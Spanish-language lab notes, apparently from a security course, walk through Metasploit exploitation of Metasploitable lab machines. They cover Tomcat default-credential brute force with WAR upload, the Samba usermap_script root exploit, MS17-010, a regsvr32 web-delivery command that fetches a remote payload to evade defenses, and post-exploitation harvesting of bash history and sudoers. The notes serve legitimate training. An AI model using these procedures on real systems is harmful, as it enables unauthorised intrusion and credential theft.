
---
## 1. Metasploit Framework: Fundamentos y Explotación

Metasploit es la herramienta estándar para el desarrollo y ejecución de exploits, permitiendo validar vulnerabilidades y realizar auditorías complejas.

### Arquitectura Modular

- **Exploits**: Código que aprovecha una vulnerabilidad específica (el "cañón").
    
- **Payloads**: Código que se ejecuta tras el éxito de la explotación (la "munición").
    
- **Auxiliary**: Herramientas como escáneres, sniffers o ataques DoS que no llevan un payload.
    
- **Encoders**: Utilizados para la ofuscación y evasión de antivirus.
    

### Comandos Esenciales (msfconsole)

- `search [nombre/CVE]`: Localiza módulos específicos.
    
- `use [ruta]`: Selecciona el módulo a utilizar.
    
- `show options`: Muestra los parámetros configurables del módulo.
    
- `set [variable] [valor]`: Configura un parámetro (ej. `set RHOST 172.16.123.135`).
    
- `info`: Muestra metadatos detallados del módulo cargado.


---

## 2. Metasploitable 1: Explotación de Servicios Linux

### Explotación de Tomcat (CVE-2010-4094)

**Objetivo:** Obtener una sesión mediante fuerza bruta en Tomcat y despliegue de WAR malicioso.

1. **Obtención de credenciales:**
    
    - Módulo: `auxiliary/scanner/http/tomcat_mgr_login`
        
    - Diccionarios: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_userpass.txt`
        
    - Resultado esperado: `tomcat:tomcat` o `admin:admin`.
    
2. **Explotación:**
    
    - Módulo: `exploit/multi/http/tomcat_mgr_deploy`
        
    - Configuración: `set HttpPassword [password]`, `set HttpUsername [user]`.
        
    - Resultado: Sesión de Meterpreter tras subir un archivo `.war` automáticamente.

### Script de Mapeo de Samba (CVE-2007-2447)

**Objetivo:** Explotar una vulnerabilidad clásica de ejecución de comandos en el nombre de usuario de Samba.

- **Módulo:** `exploit/multi/samba/usermap_script`
    
- **Procedimiento:**
    
    1. `use exploit/multi/samba/usermap_script`
        
    2. `set RHOST [IP_METASPLOITABLE_1]`
        
    3. `exploit`
        
- **Resultado:** Acceso directo como **root** (no requiere escalada posterior).

---

## 3. Metasploitable 2: Java RMI y Web Apps

### Java RMI Default Configuration

**Objetivo:** Aprovechar que el servidor Java RMI permite la carga de clases desde fuentes externas.

- **Módulo:** `exploit/multi/misc/java_rmi_server`
    
- **CVE:** *CVE-2011-3556*.
    
- **Nota Técnica:** El servidor confía en los objetos serializados enviados, permitiendo la ejecución de código Java arbitrario.
    

### Vulnerabilidad en Twiki (Historial)

**Objetivo:** Explotar un fallo en la gestión de revisiones de Twiki.

- **Módulo:** `exploit/unix/webapp/twiki_history`
    
- **Acción:** A veces el exploit devuelve un error de timeout, pero la sesión se crea igualmente. Ejecutar `sessions -l` para verificar.

---

## 4. Metasploitable 3: Entornos Windows Modernos

### Eternal Romance (SMB)

**Objetivo:** Ejecución remota de código en SMB (similar a EternalBlue pero para versiones específicas).

- **Vulnerabilidad:** MS17-010.
    
- **Módulo:** `exploit/windows/smb/ms17_010_psexec`
    
- **Procedimiento:**
    
    1. `set RHOST [IP_WIN]`
        
    2. `set SMBUser [usuario_valido]` (si se tiene) o intentar anónimo.
        
- **Resultado:** Shell con privilegios de SYSTEM.

### Web Delivery + Regsvr32

**Objetivo:** Evadir defensas usando una DLL maliciosa servida por HTTP.

1. **Preparación:**
    
    - `use exploit/multi/script/web_delivery`
        
    - `set target 3` (Regsvr32)
        
    - `set payload windows/meterpreter/reverse_tcp`
        
2. **Ejecución:** Metasploit generará una línea de comandos tipo `regsvr32 /s /n /u /i:http://... scrobj.dll`.
    
3. **Entrega:** Ejecutar ese comando en la víctima (usando la shell obtenida en el ejercicio de Eternal Romance).

---

## Post-Explotación: Recolección de Inteligencia (Gather)

Basado en las actividades de **Metasploitable 1 y 2 (UT6.6)**. Una vez tengas la sesión abierta:

### Detección de VM

- **Comando:** `run post/linux/gather/checkvm`
    
- **Propósito:** Confirmar si estamos en un entorno virtualizado (VMware, VirtualBox) para adaptar el malware.

### Extracción de Secretos y Sudoers

- **Comando:** `run post/linux/gather/enum_users_history`
    
- **Datos obtenidos:**
    
    - `~/.bash_history`: Comandos escritos por el usuario (a veces contienen contraseñas en texto plano).
        
    - `/etc/sudoers`: Ver qué usuarios pueden ejecutar comandos como root sin contraseña.

### Rootkit Detection

- **Comando:** `run post/linux/gather/check_rootkit`
    
- **Propósito:** Determinar si la máquina ya ha sido comprometida previamente o tiene persistencia instalada.

---

